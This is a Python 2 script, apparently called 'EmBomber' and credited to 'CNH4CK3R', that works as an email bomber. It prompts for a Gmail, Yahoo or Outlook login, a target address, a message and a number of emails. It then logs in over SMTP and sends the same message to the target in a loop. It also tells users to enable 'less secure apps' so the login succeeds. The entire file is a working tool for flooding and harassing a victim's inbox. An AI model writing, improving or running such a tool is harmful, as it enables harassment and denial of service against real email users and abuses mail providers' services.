#!/usr/bin/python
import smtplib
import time
import os
import getpass
import sys

class bcolors:
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'


def bomb():
	os.system('clear')
	print bcolors.OKGREEN + '''
			 \|/
                       `--+--'
                          |
                      ,--'#`--.
                      |#######|
                   _.-'#######`-._
                ,-'###############`-.
              ,'#####################`,         .___     .__         .
             |#########################|        [__ ._ _ [__) _ ._ _ |_  _ ._.
            |###########################|       [___[ | )[__)(_)[ | )[_)(/,[
           |#############################|
           |#############################|              AUTHOR: CNH4CK3R
           |#############################|
            |###########################|
             \#########################/
              `.#####################,'
                `._###############_,'
                   `--..#####..--'                                 ,-.--.
*.______________________________________________________________,' (Bomb)
                                                                    `--' ''' + bcolors.ENDC


os.system('clear')
try:
	file1 = open('Banner.txt', 'r')
	print(' ')
	print bcolors.OKGREEN + file1.read() + bcolors.ENDC
	file1.close()
except IOError:
	print('BANNER FILE NOT FOUND')

#Input
print(bcolors.WARNING + '''
CHOOSE A MAIL SERVICE:
1) GMAIL
2) YAHOO
3) HOTMAIL/OUTLOOK
''' + bcolors.ENDC + '--------------------------------------------------------------')
try:
	server = raw_input(bcolors.OKGREEN + 'MAIL SERVER: ' + bcolors.ENDC)
	user = raw_input(bcolors.OKGREEN + 'YOUR EMAIL: ' + bcolors.ENDC)
	pwd = getpass.getpass(bcolors.OKGREEN + 'PASSWORD: ' + bcolors.ENDC)
	to = raw_input(bcolors.OKGREEN + 'TO: ' + bcolors.ENDC)
	subject = raw_input(bcolors.OKGREEN + 'SUBJECT (OPTIONAL): ' + bcolors.ENDC)
	body = raw_input(bcolors.OKGREEN + 'MESSAGE: ' + bcolors.ENDC)
	nomes = input(bcolors.OKGREEN + 'NUMBER OF EMAILS TO SEND: ' + bcolors.ENDC)
	no = 0
	message = 'FROM: ' + user + '\nSUBJECT: ' + subject + '\n' + body
except KeyboardInterrupt:
	print bcolors.FAIL + '\nCANCELED' + bcolors.ENDC
	sys.exit()

#Gmail

if server == '1' or server == 'gmail' or server == 'Gmail':
	bomb()
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.ehlo()
	server.starttls()
	try:
		server.login(user, pwd)
	except smtplib.SMTPAuthenticationError:
		print bcolors.FAIL + '''YOUR USERNAME OR PASSWORD IS INCORRECT, PLEASE TRY AGAIN USING THE CORRECT CREDENTIALS
		OR YOU NEED TO ENABLE LESS SECURE APPS
		ON GMAIL: https://myaccount.google.com/lesssecureapps ''' + bcolors.ENDC
		sys.exit()
	while no != nomes:
		try:
			server.sendmail(user, to, message)
			print bcolors.WARNING + 'SUCCESSFULLY SENT ' + str(no+1) + ' EMAILS' + bcolors.ENDC
			no += 1
			time.sleep(.8)
		except KeyboardInterrupt:
			print bcolors.FAIL + '\nCANCELED' + bcolors.ENDC
			sys.exit()
		except:
			print "FAILED TO SEND "
	server.close()
	
#Yahoo
elif server == '2' or server == 'Yahoo' or server == 'yahoo':
	server = smtplib.SMTP("smtp.mail.yahoo.com", 587)
	bomb()
	server.starttls()
	try:
		server.login(user, pwd)
	except smtplib.SMTPAuthenticationError:
		print bcolors.FAIL + '''YOUR USERNAME OR PASSWORD IS INCORRECT, PLEASE TRY AGAIN USING THE CORRECT CREDENTIALS
		OR YOU NEED TO ENABLE LESS SECURE APPS
		ON YAHOO: https://login.yahoo.com/account/security?.scrumb=tiby8txuvjt#less-secure-apps
		''' + bcolors.ENDC
		sys.exit()
	while no != nomes:
		try:
			server.sendmail(user, to, message)
			print bcolors.WARNING + 'SUCCESSFULLY SENT ' + str(no + 1) + ' EMAILS' + bcolors.ENDC
			no += 1
			time.sleep(.8)
		except KeyboardInterrupt:
			print bcolors.FAIL + '\nCANCELED' + bcolors.ENDC
			sys.exit()
		except:
			print "FAILED TO SEND"
	server.close()
	
#Hotmail/Outlook
elif server == '3' or server == 'outlook' or server == 'Outlook' or server == 'Hotmail' or server == 'hotmail':
	server = smtplib.SMTP("smtp-mail.outlook.com", 587)
	bomb()
	server.ehlo()
	server.starttls()
	try:
		server.login(user, pwd)
	except smtplib.SMTPAuthenticationError:
		print bcolors.FAIL + 'YOUR USERNAME OR PASSWORD IS INCORRECT, PLEASE TRY AGAIN USING THE CORRECT CREDENTIALS' + bcolors.ENDC
		sys.exit()
	while no != nomes:
		try:
			server.sendmail(user, to, message)
			print bcolors.WARNING + 'SUCCESSFULLY SENT ' + str(no + 1) + ' EMAILS' + bcolors.ENDC
			no += 1
			time.sleep(.8)
		except KeyboardInterrupt:
			print bcolors.FAIL + '\nCANCELED' + bcolors.ENDC
			sys.exit()
		except smtplib.SMTPAuthenticationError:
			print '\nTHE USERNAME OR PASSWORD YOU ENTERED IS INCORRECT.'
			sys.exit()
		except:
			print "FAILED TO SEND "
	server.close()
	
else:
	print 'WORKS ONLY WITH GMAIL, YAHOO, OUTLOOK AND HOTMAIL.'
	sys.exit()
